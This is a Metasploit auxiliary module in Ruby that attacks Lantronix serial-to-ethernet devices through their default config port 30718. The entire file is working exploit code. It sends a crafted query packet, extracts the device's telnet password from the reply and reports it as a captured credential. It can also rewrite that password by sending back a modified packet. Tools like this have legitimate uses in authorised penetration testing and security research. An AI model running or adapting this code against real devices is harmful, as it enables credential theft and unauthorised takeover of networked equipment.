##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Lantronix Password Management via 77feh',
      'Description' => %q{
          This module can manage simple password on Lantronix serial-to-ethernet
        devices via the config port (30718/udp/tcp, enabled by default).
      },
      'Author'      => 'kost',
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::CHOST,
        Opt::RPORT(30718),
        OptString.new('PASSWORD', [ false, "What password to set", nil ]),
        OptString.new('IPPROTO', [ true, "What IP protocol to use (tcp/udp)", 'udp' ])
      ], self.class)
  end

  def run_host(ip)
    lsock = nil
    simplepass = ''
    res = nil

    begin
      if datastore['IPPROTO'] == 'udp' then
        vprint_status("#{rhost} - using UDP for communication.")
        lsock = Rex::Socket::Udp.create( {
          'LocalHost' => datastore['CHOST'] || nil,
          'PeerHost'  => ip,
          'PeerPort'  => datastore['RPORT'],
          'Context'   =>
          {
            'Msf' => framework,
            'MsfExploit' => self
          }
        })
      else
        vprint_status("#{rhost} - using TCP for communication.")
        lsock = connect
      end

      lsock.put("\x00\x00\x00\xF8")

      result = lsock.recvfrom(65535, 10) and result[1]
      res = result[0]
      # vprint_status("#{rhost} - got #{Rex::Text.to_hex_dump(res)}")

      if res and res.length > 18 and res[0,4] == "\x00\x00\x00\xF9"
          # vprint_status("#{rhost} - Got packet with expected size.")
          simplepass = res[12,4]
          if simplepass == "\x00\x00\x00\x00"
            print_status("#{rhost} - Simple password disabled. You can login without password or enhanced password.")
          else
            print_good("#{rhost} - Telnet password found: #{simplepass.to_s}")

            report_auth_info({
              :host         => rhost,
              :port         => 9999,
              :sname        => 'telnet',
              :duplicate_ok => false,
              :pass         => simplepass.to_s
            })
          end
      else
        print_status("#{rhost} - Unusual response from host")
      end

      # if password is set, change it
      if datastore['PASSWORD'] then
        if datastore['PASSWORD'].length != 4 then
          vprint_error("#{rhost} - Length of password should be fixed size of 4 chars")
        else
          vprint_status("#{rhost} - password set. Changing password to #{datastore['PASSWORD']}")
          res[12,4]=datastore['PASSWORD']
          vprint_status("#{rhost} - sending #{Rex::Text.to_hex_dump(res)}")
          lsock.put(res)
        end
      end

    rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused, ::IOError
      print_error("Connection error")
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("Unknown error: #{e.class} #{e}")
    ensure
      lsock.close if lsock
    end

  end

end
